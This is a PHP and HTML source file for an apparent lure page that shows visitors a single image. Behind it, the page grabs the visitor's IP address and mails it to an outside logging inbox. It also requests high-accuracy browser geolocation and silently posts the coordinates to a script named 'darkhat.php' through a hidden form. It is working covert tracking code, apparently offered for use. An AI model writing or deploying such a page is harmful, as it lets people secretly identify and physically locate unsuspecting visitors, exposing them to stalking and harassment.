<?PHP
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
$user_ip = getUserIP();
?>
<html>
<head>
<script>
function displayPosition(position) {
  document.getElementById("total").value=position.coords.latitude+" "+position.coords.longitude;
  document.getElementById("sampleForm").submit();
  console.log("Submitted form");
  console.log(position.coords.latitude+" "+position.coords.longitude);
}
if (navigator.geolocation) {
    console.log("Finding geolocation");
  var timeoutVal = 10 * 1000 * 1000;
  navigator.geolocation.getCurrentPosition(
    displayPosition, 
    function (error) { switch(error.code) {
        case error.PERMISSION_DENIED:
            console.log("User denied the request for Geolocation.");
            break;
        case error.POSITION_UNAVAILABLE:
            console.log("Location information is unavailable.");
            break;
        case error.TIMEOUT:
            console.log("The request to get user location timed out.");
            break;
        case error.UNKNOWN_ERROR:
            console.log("An unknown error occurred.");
            break;
    } },
    { enableHighAccuracy: true, timeout: timeoutVal, maximumAge: 0 }
  );
}
</script>
</head>
<body>
<form id="sampleForm" name="sampleForm" method="post" action="darkhat.php">
<input type="hidden" name="loc" id="total" value="">
</form>
<img src="image.jpg">
</body>
</html>
<?PHP
mail("logger@mailinator.com","New Visitor:",$user_ip);
?>